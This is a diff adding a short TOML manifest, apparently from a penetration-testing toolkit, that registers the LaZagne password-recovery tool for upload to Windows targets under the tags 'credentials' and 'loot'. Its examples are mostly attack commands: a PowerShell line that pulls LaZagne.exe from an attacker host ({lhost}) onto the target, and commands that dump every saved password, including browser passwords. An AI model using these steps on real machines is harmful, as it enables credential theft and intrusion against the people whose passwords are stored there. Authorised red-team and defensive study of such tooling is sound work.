@@ -1,0 +1,17 @@
+schema = 1
+kind = "upload"
+description = "Recovers the passwords that browsers, mail clients and other software saved on Windows"
+tags = ["windows", "credentials", "passwords", "loot"]
+upstream = "https://github.com/AlessandroZ/LaZagne"
+licence = "LGPL-3.0"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/LaZagne.exe -OutFile LaZagne.exe",
+  "LaZagne.exe all",
+  "LaZagne.exe browsers -oN",
+]
+
+[[upload]]
+path = "files/LaZagne.exe"
+as = "LaZagne.exe"
+note = "Windows"
